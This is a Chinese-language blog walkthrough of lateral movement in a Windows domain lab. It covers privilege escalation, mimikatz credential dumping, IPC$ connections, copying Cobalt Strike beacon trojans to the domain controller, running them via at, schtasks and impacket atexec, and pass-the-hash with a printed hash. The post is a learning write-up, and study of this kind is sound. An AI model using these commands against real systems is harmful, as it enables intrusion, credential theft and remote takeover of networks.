anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url">内网渗透</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/" itemprop="url">域渗透</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E5%AD%A6%E4%B9%A0/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>学习</span></a><a class="article-meta__tags" href="/tags/%E5%86%85%E7%BD%91/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>内网</span></a><a class="article-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>渗透</span></a><a class="article-meta__tags" href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>横向移动</span></a></span></div></div><h1 class="post-title" itemprop="name headline">横向移动</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-10-11T14:16:00.000Z" title="发表于 2024-10-11 22:16:00">2024-10-11</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-10-11T14:24:57.491Z" title="更新于 2024-10-11 22:24:57">2024-10-11</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">10.7k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>43分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="横向移动"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://cszvvds.cc/2024/10/11/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"><header><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url">内网渗透</a><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/" itemprop="url">域渗透</a><a href="/tags/%E5%AD%A6%E4%B9%A0/" tabindex="-1" itemprop="url">学习</a><a href="/tags/%E5%86%85%E7%BD%91/" tabindex="-1" itemprop="url">内网</a><a href="/tags/%E6%B8%97%E9%80%8F/" tabindex="-1" itemprop="url">渗透</a><a href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" tabindex="-1" itemprop="url">横向移动</a><h1 id="CrawlerTitle" itemprop="name headline">横向移动</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">VVkladg0r</span><time itemprop="dateCreated datePublished" datetime="2024-10-11T14:16:00.000Z" title="发表于 2024-10-11 22:16:00">2024-10-11</time><time itemprop="dateCreated datePublished" datetime="2024-10-11T14:24:57.491Z" title="更新于 2024-10-11 22:24:57">2024-10-11</time></header><h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><h3 id="横向移动之前"><a href="#横向移动之前" class="headerlink" title="横向移动之前"></a>横向移动之前</h3><p>靶场学习</p>
<p>拓扑图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933673e160.png" alt="image-20240913221753133"></p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>cs上线webserver</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/67093365c3478.png" alt="image-20240913222219986"></p>
<p>先看下他是不是内网用户</p>
<p><code>shell net user /domain</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709335b87914.png" alt="image-20240913222353463"></p>
<p>是</p>
<p>且域内用户：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Administrator            boss                     dbadmin                  </span><br><span class="line">debian                   devadmain                fedora                   </span><br><span class="line">fileadmin                Guest                    hr                       </span><br><span class="line">itadmin                  jenkins                  kali                     </span><br><span class="line">klion                    klionsec                 krbtgt                   </span><br><span class="line">logers                   logtest                  mack                     </span><br><span class="line">mary                     SM_6ef9b5ce414946ae9     SM_c330a5709f6a478b8     </span><br><span class="line">SM_d3853544b62a421fb     SM_d80bb46e75164f258     vpnadm                   </span><br><span class="line">webadmin</span><br></pre></td></tr></table></figure>

<p>且 域控：</p>
<p>OWA2010CN-God.god.org</p>
<p>ping命令确定域控</p>
<p><code>shell ping OWA2010CN-God.god.org </code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709335c323cb.png" alt="image-20240913223015766"></p>
<p>域控ip：</p>
<p>192.168.3.21</p>
<p>cs端口扫描一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709336781be0.png" alt="image-20240913223126521"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709335a2b366.png" alt="image-20240913223201437"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/67093359c0f5a.png" alt="image-20240913224717664"></p>
<p>192.168.3.30不知道为什么没有扫出来</p>
<p>问题不大</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>cs简单提下权</p>
<p>因为这里重点是学习横向移动 所以提权就简单一点</p>
<p>总之就是要拿到system权限</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709335d6ce26.png" alt="image-20240913223416126"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/67093358b22b9.png" alt="image-20240913223435076"></p>
<p>提权成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/67093359a687f.png" alt="image-20240913223502856"></p>
<p><strong>因为是本地靶场 就不权限维持了</strong></p>
<h4 id="凭证抓取"><a href="#凭证抓取" class="headerlink" title="凭证抓取"></a>凭证抓取</h4><p>为了更好的在域内进行横向渗透</p>
<p>我们需要抓取凭证</p>
<p>这里使用cs抓</p>
<p>用system的权限抓</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/67093365b3893.png" alt="image-20240913224250200"></p>
<p>抓取hash和抓取明文密码都可以</p>
<p>他们调用的都是猕猴桃工具–mimikatz</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933586c36b.png" alt="image-20240913224417639"></p>
<p>抓到</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/67093363752b9.png" alt="image-20240913224450585"></p>
<p>把hash也抓了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/67093368b055a.png" alt="image-20240913224534560"></p>
<p>不管是抓到明文密码还是hash都是可以进行传递的</p>
<h3 id="IPC横向移动"><a href="#IPC横向移动" class="headerlink" title="IPC横向移动"></a>IPC横向移动</h3><p>做好了前面的一系列前置操作后</p>
<p>我们就可以对域控进行攻击了</p>
<p>这里我们用到的是IPC横向移动</p>
<blockquote>
<p><strong>IPC（Inter-Process Communication）协议是指用于不同进程之间进行通信和数据交换的协议。</strong>在操作系统中，进程是指正在运行的程序的实例。进程可以是同一应用程序的不同实例，也可以是不同应用程序之间的独立实例。进程之间的通信是实现多任务、协作和数据交换的关键。</p>
</blockquote>
<blockquote>
<p>IPC协议提供了一套规范和机制，使不同进程能够安全、可靠地进行通信。它允许进程之间共享数据、传递消息、进行同步操作等。常见的IPC协议包括以下几种：</p>
<ul>
<li><p>管道（Pipe）：管道是一种半双工的通信机制，可用于在父子进程或者兄弟进程之间进行通信。在Unix和Linux系统中，管道可以通过创建一个管道文件描述符来实现进程间通信。</p>
</li>
<li><p>命名管道（Named Pipe）：命名管道是一种有名的管道，它允许无亲缘关系的进程进行通信。命名管道在文件系统中有一个唯一的名字，进程可以通过该名字打开和使用管道进行通信。</p>
</li>
<li><p>消息队列（Message Queue）：消息队列是一种按照消息进行通信的机制。进程可以将消息发送到消息队列中，其他进程可以从队列中接收和处理消息。消息队列通常具有先进先出的特性，并提供了一种异步通信的方式。</p>
</li>
<li><p>共享内存（Shared Memory）：共享内存允许不同进程访问同一块内存区域，从而实现高效的数据共享。多个进程可以将共享内存映射到各自的地址空间中，以便直接读写共享数据，避免了数据复制和传输的开销。</p>
</li>
<li><p>套接字（Socket）：套接字是一种网络编程中常用的IPC机制，它允许不同主机上的进程进行网络通信。套接字提供了一种可靠的、面向连接的通信方式，可以通过TCP或UDP协议在网络中传输数据。</p>
</li>
<li><p>信号量（Semaphore）：信号量是一种用于同步进程的机制，它可以用来保护共享资源，控制进程的访问顺序，以及实现进程间的互斥和同步操作。</p>
</li>
</ul>
</blockquote>
<p>总之我们可以通过IPC 对目标发起一个管道链接 我们可以通过这个管道链接对目标进行一些操作</p>
<p>使用流程</p>
<ul>
<li>建立IPC连接到目标</li>
<li>拷贝要执行的木马到目标主机</li>
<li>执行木马(计划任务)</li>
<li>删除IPC</li>
</ul>
<h4 id="建立IPC连接到目标"><a href="#建立IPC连接到目标" class="headerlink" title="建立IPC连接到目标"></a>建立IPC连接到目标</h4><p>at计划任务打DC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\administrator # 建立ipc连接  这里的用户密码都是webserver的</span><br><span class="line"></span><br><span class="line">copy beacon.exe \\192.168.3.21\c$ 			#拷贝执行文件到目标机器</span><br><span class="line"></span><br><span class="line">net time	#获取服务器时间</span><br><span class="line"></span><br><span class="line">at \\192.168.3.21 20:42 c:\beacon.exe  #添加计划任务</span><br><span class="line"></span><br><span class="line">connect 192.168.3.21 4444    #正向连接木马</span><br></pre></td></tr></table></figure>

<p>schtasks计划任务打DC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\192.168.3.32\ipc$ &quot;Admin12345&quot; /user:god.org\administrator # 建立ipc连接：</span><br><span class="line"></span><br><span class="line">copy beacon.exe \\192.168.3.32\c$ #复制文件到其C盘</span><br><span class="line"></span><br><span class="line">schtasks /S 192.168.3.32 /U administrator /P Admin12345 /Create /TN beacon /TR &#x27;c:\beacon.exe&#x27; /SC once /f 						#创beacon任务对应执行文件</span><br><span class="line"></span><br><span class="line">schtasks /run /s 192.168.3.32 /tn beacon /i 	#运行beacon任务</span><br><span class="line"></span><br><span class="line">schtasks /delete /s 192.168.3.21 /tn beacon /f	#删除beacon任务</span><br></pre></td></tr></table></figure>





<p>建立IPC连接</p>
<p><code>shell net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\administrator</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709335b3f98a.png" alt="image-20240913230822560"></p>
<p>看下连没连上</p>
<p><code>shell net use</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709335bdb743.png" alt="image-20240913231051692"></p>
<p>好</p>
<p>但是现在我们是不能直接用木马让DC连接到kali</p>
<p>因为DC不出网 </p>
<p>但是DC是可以和webserver正常通信的</p>
<p>所以我们要用webserver主机作为跳板 让DC连接它 再间接连接到我们的卡kali</p>
<p>新建一个正向监听</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933635252b.png" alt="image-20240913231625318"></p>
<p>生成木马</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/67093365f05af.png" alt="image-20240913231747535"></p>
<p>注意这里要生成无状态可执行程序</p>
<p>区分：</p>
<p>无状态可执行程序–&gt;unstager</p>
<p>可执行程序–&gt;stager</p>
<p><strong>stager:</strong></p>
<p>首先生成的paylod为stager，是一个小程序，通常是手工优化的汇编指令，用于远程下载一个 payload stage，将其注入到当前被执行服务器内存，对其传达指令</p>
<p><strong>靶机向cs服务器发送了一个下载请求，请求下载真正的payload</strong></p>
<p><strong>unstager：</strong></p>
<p>unstage为部分阶段的payload，所有指令都集成到了里面</p>
<p>它生成一个叫beacon.exe，双击运行后我们并不会在Web日志中看到任何请求信息。因为unstage会将所有的利用代码一开始就集中到了beacon.exe</p>
<h4 id="拷贝要执行的木马到目标主机"><a href="#拷贝要执行的木马到目标主机" class="headerlink" title="拷贝要执行的木马到目标主机"></a>拷贝要执行的木马到目标主机</h4><h5 id="IPC连接拷贝"><a href="#IPC连接拷贝" class="headerlink" title="IPC连接拷贝"></a>IPC连接拷贝</h5><p>先把我们的beacon.exe弄到webshell主机上</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709335a2ba7d.png" alt="image-20240913233128492"></p>
<p>然后用命令拷贝</p>
<p><code>copy beacon.exe \\192.168.3.21\c$</code></p>
<p>拷到C盘</p>
<p>当然 也可以加上路径</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709335a2a21e.png" alt="image-20240913233605428"></p>
<h4 id="计划任务执行木马"><a href="#计划任务执行木马" class="headerlink" title="计划任务执行木马"></a>计划任务执行木马</h4><h5 id="正向连接上线"><a href="#正向连接上线" class="headerlink" title="正向连接上线"></a>正向连接上线</h5><p>首先我们需要获取一下服务器的时间</p>
<p><code>shell net time</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709335859914.png" alt="image-20240913234330462"></p>
<p>根据时间</p>
<p>我们添加一下计划任务</p>
<p><code>shell at \\192.168.3.21 20:42 c:\beacon.exe</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709335ab53f9.png" alt="image-20240913234756570"></p>
<p>等待计划任务执行</p>
<p>因为我们开的的正向连接的木马 所以我们要用webserver去绑定4444端口</p>
<p><code>connect 192.168.3.21 4444 </code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/67093368f1387.png" alt="image-20240913235545753"></p>
<p>直接上线</p>
<h5 id="反向连接上线"><a href="#反向连接上线" class="headerlink" title="反向连接上线"></a>反向连接上线</h5><p>当然因为webserver和DC是互通的</p>
<p>我们也可以用反向连接</p>
<p>webserver的system权限转发上线来建监听器</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709336713bb6.png" alt="image-20240914000023637"></p>
<p>配置一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933659739b.png" alt="image-20240914000139829"></p>
<p>生成木马并上传到webserver</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709335cbb7ea.png" alt="image-20240914000222642"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709336422af8.png" alt="image-20240914000337771"></p>
<p>IPC拷贝过去</p>
<p><code>shell copy fx.exe \\192.168.3.21\c$</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709335af223b.png" alt="image-20240914000816911"></p>
<p>计划任务执行一下</p>
<p>环境问题 这里我没有上线成功</p>
<p>但是是可以上线的</p>
<h4 id="插件IPC移动"><a href="#插件IPC移动" class="headerlink" title="插件IPC移动"></a>插件IPC移动</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/67093369946b8.png" alt="image-20240914004111192"></p>
<p>插件内置了IPC移动</p>
<p>拿下DC后就可以随便打了</p>
<p>这里我们打一下marry–&gt;192.168.3.25</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933598470d.png" alt="image-20240914004331496"></p>
<p>连接建立成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709335eb360b.png" alt="image-20240914004420936"></p>
<h4 id="IPC常见报错"><a href="#IPC常见报错" class="headerlink" title="IPC常见报错"></a>IPC常见报错</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限</span><br><span class="line">（2）51：网络问题，Windows 无法找到网络路径</span><br><span class="line">（3）53：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有防火墙等问题</span><br><span class="line">（4）67：找不到网络名（本地主机中lanmanworkstation服务未启动或者目标主机删除了ipc$）。</span><br><span class="line">（5）1219：提供的凭据和已存在的凭据集冲突，说明已建立 IPC$，需要先删除</span><br><span class="line">（6）1326：账号密码错误</span><br><span class="line">（7）1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况</span><br><span class="line">（8）2242：用户密码过期，目标有账号策略，强制定期更改密码</span><br></pre></td></tr></table></figure>



<h3 id="套件-impacket-ipc"><a href="#套件-impacket-ipc" class="headerlink" title="套件-impacket-ipc"></a>套件-impacket-ipc</h3><p>本身它需要有python环境才能执行</p>
<p>这里我们用魔改版</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240914005539046.png" alt="image-20240914005539046"></p>
<p>里面有很多exe程序</p>
<p>我们用第一个就行</p>
<p>先把文件传到webserver上去</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709336989d33.png" alt="image-20240914005749139"></p>
<p>使用命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CS本地用户明文连接：</span><br><span class="line"></span><br><span class="line">shell atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;</span><br><span class="line"></span><br><span class="line">CS域内用户明文连接：</span><br><span class="line"></span><br><span class="line">shell atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;ver&quot;</span><br><span class="line"></span><br><span class="line">CS域内本地用户明文密文连接：</span><br><span class="line"></span><br><span class="line">本地用户hash传递</span><br><span class="line">shell atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;</span><br><span class="line"></span><br><span class="line">域用户hash传递</span><br><span class="line">shell atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p><code>shell atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;</code></p>
<p>这里的第二个.表示本地 如果是域的话要用域名</p>
<p><code>shell atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709335bd4884.png" alt="image-20240914010017769"></p>
<p>根据命令</p>
<p>我们抓到的hash也是可以传递执行命令的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709336603068.png" alt="image-20240914010230317"></p>
<p><code>shell atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/67093359e9204.png" alt="image-20240914010616672"></p>
<p>工具生成一下命令</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933663d7f3.png" alt="image-20240914010955504"></p>
<p>随便找个cmd的命令</p>
<p>这个dc.exe是一个基于DC的反向连接的木马</p>
<p>将whoami换成我们生成的命令</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/67093367e1c37.png" alt="image-20240914011143184"></p>
<p>成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/67093358f3bf1.png" alt="image-20240914011214951"></p>
<p>执行木马</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709335cb6189.png" alt="image-20240914011315563"></p>
<p>上线</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/67093368eec9c.png" alt="image-20240914011344330"></p>
<p><strong>这也就是IPC通过web下载文件的形式来进行横向移动</strong></p>
<p>但是他也有弊端</p>
<p>1.上传套件–套件比较大–容易被杀软识别</p>
